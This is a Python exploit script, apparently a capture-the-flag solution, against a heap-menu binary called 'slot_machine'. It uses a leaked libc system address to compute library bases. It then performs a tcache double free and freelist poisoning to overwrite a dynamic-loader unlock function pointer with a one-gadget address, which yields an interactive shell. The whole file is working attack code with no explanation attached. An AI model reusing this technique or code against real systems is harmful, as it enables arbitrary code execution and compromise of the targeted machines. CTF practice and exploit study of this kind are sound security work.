#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './slot_machine'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'lremote', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', lremote = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        lremote = {'host':'localhost', 'port':4296}, \
                        remote  = {'host':'arcade.fluxfingers.net', 'port':1815})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        lremote = 'libc.so.6', \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_system      = libc.sep_function['system']

'''
# ubuntu 18.04
offset_libc_onegadget   = 0xe569f
offset_ld_base          = 0x618000
offset_ld_rtld_global   = 0x1060
offset_fp_lock          = 0xf00     # rtld_lock_default_lock_recursive
'''

# Arch linux 2018.10.01
offset_libc_onegadget   = 0x45254
offset_ld_base          = 0x1cb000
offset_ld_rtld_global   = 0x2a000
offset_fp_unlock        = 0xf10     # rtld_lock_default_unlock_recursive

#==========

def attack(conn):
    sm = SlotMachine(conn)

    libc.address            = sm.addr_libc_system - offset_libc_system
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_onegadget     = libc.address + offset_libc_onegadget

    addr_ld_base            = libc.address + offset_ld_base
    addr_ld_rtld_global     = addr_ld_base + offset_ld_rtld_global
    # addr_ld_fp_lock         = addr_ld_rtld_global + offset_fp_lock
    addr_ld_fp_unlock       = addr_ld_rtld_global + offset_fp_unlock

    sm.malloc(0x10)
    sm.free(0)
    sm.free(0)

    sm.malloc(0x10)
    sm.write(p64(addr_ld_fp_unlock))
    sm.malloc(0x10)
    sm.malloc(0x10)

    sm.write(p64(addr_libc_onegadget))

class SlotMachine:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

        self.recvuntil('Here is system : ')
        self.addr_libc_system = int(self.recvuntil('\n', drop=True), 16)

    def malloc(self, size):
        self.sendlineafter('[ 4 ] : bye!\n', '1')
        self.sendlineafter('?\n', str(size))

    def free(self, where):
        self.sendlineafter('[ 4 ] : bye!\n', '2')
        self.sendlineafter('?\n', str(where))

    def write(self, data):
        self.sendlineafter('[ 4 ] : bye!\n', '3')
        self.sendafter('?\n', data)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
